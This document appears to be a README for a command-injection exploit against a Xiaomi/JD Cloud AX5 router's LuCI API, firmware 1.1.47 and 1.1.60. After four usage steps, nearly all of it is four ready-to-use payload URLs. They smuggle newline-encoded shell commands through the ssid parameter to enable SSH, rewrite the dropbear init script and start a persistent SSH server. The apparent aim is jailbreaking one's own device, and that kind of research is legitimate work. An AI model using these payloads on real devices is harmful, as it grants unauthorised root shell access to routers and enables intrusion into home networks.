## Usage

1. Download & Install firmware.
2. Login and get  `TOKEN`.
3. Edit && Enter payload URL to execute commands.
4. Enjoy.

## Payload

Version: 1.1.47 and 1.1.60

```
http://192.168.31.1/cgi-bin/luci/;stok=PUT_TOKEN_HERE/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0anvram%20set%20ssh_en=1%0anvram%20commit%0a

http://192.168.31.1/cgi-bin/luci/;stok=PUT_TOKEN_HERE/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0aecho%20sed%20-i%20's/channel=.*/channel="debug"/g'%20/etc/init.d/dropbear%20>%20/tmp/r.sh%0ash%20/tmp/r.sh%0arm%20/tmp/r.sh%0a

http://192.168.31.1/cgi-bin/luci/;stok=PUT_TOKEN_HERE/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20start%0a

http://192.168.31.1/cgi-bin/luci/;stok=PUT_TOKEN_HERE/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20enable%0a
```

## Ref

* https://github.com/NyaMisty/luadec_miwifi

* [[Ax5京东云\]1.1.47固件下载地址 - 京东云无线宝 - 恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-4128465-1-1.html)

